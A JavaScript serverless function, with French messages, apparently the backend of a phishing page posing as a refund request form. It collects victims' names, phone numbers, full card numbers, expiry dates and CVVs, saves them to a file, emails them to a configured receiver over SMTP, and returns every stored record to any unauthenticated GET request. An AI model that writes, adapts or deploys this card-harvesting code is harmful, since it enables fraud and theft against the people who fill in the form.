const nodemailer = require('nodemailer');
const fs = require('fs');

function loadDemandes() {
  try {
    if (fs.existsSync('/tmp/demandes.json')) {
      return JSON.parse(fs.readFileSync('/tmp/demandes.json', 'utf8'));
    }
  } catch {}
  return [];
}

function saveDemande(entry) {
  try {
    const demandes = loadDemandes();
    demandes.push(entry);
    fs.writeFileSync('/tmp/demandes.json', JSON.stringify(demandes, null, 2), 'utf8');
  } catch {}
}

function json(statusCode, body) {
  return {
    statusCode,
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  };
}

function isEmailConfigured() {
  return Boolean(
    process.env.RECEIVER_EMAIL &&
    process.env.SMTP_USER &&
    process.env.SMTP_PASS
  );
}

function createTransporter() {
  return nodemailer.createTransport({
    host: process.env.SMTP_HOST || 'smtp.gmail.com',
    port: Number(process.env.SMTP_PORT) || 587,
    secure: false,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  });
}

exports.handler = async (event) => {
  if (event.httpMethod === 'GET') {
    return json(200, { demandes: loadDemandes() });
  }

  if (event.httpMethod !== 'POST') {
    return json(405, { error: 'Methode non autorisee.' });
  }

  let body;
  try {
    body = JSON.parse(event.body || '{}');
  } catch {
    return json(400, { error: 'Donnees invalides.' });
  }

  const { nom, telephone, rib, nomCompte, date, CVV } = body;

  if (!nom || !telephone || !rib || !nomCompte || !date || !CVV) {
    return json(400, { error: 'Tous les champs sont obligatoires.' });
  }

  const cardNumber = String(rib).replace(/\s/g, '');

  if (!/^\d{16}$/.test(cardNumber)) {
    return json(400, { error: 'Le numero de carte doit contenir exactement 16 chiffres.' });
  }

  if (!/^\d{3}$/.test(String(CVV))) {
    return json(400, { error: 'Le CVV doit contenir exactement 3 chiffres.' });
  }

  const entry = { id: Date.now(), dateReception: new Date().toISOString(), nom, telephone, rib: cardNumber, nomCompte, date, CVV };
  saveDemande(entry);

  if (!isEmailConfigured()) {
    return json(200, { success: true, message: 'Demande enregistree (email non configure).' });
  }

  const html = `
    <h2>Nouvelle demande de remboursement</h2>
    <h3>Informations personnelles</h3>
    <p><strong>Nom :</strong> ${nom}</p>
    <p><strong>Telephone :</strong> ${telephone}</p>
    <h3>Coordonnees de carte</h3>
    <p><strong>Numero de carte :</strong> ${cardNumber}</p>
    <p><strong>Nom du titulaire :</strong> ${nomCompte}</p>
    <p><strong>Mois et annee :</strong> ${date}</p>
    <p><strong>CVV :</strong> ${CVV}</p>
    <hr>
    <p><em>Recu le ${new Date().toLocaleString('fr-FR')}</em></p>
  `;

  try {
    const transporter = createTransporter();
    await transporter.sendMail({
      from: process.env.SMTP_USER,
      to: process.env.RECEIVER_EMAIL,
      subject: `Demande de remboursement - ${nom}`,
      html,
    });
    return json(200, { success: true, message: 'Votre demande a ete envoyee avec succes.' });
  } catch (err) {
    return json(200, { success: true, message: 'Demande enregistree. Email non envoye.', emailError: err.message });
  }
};
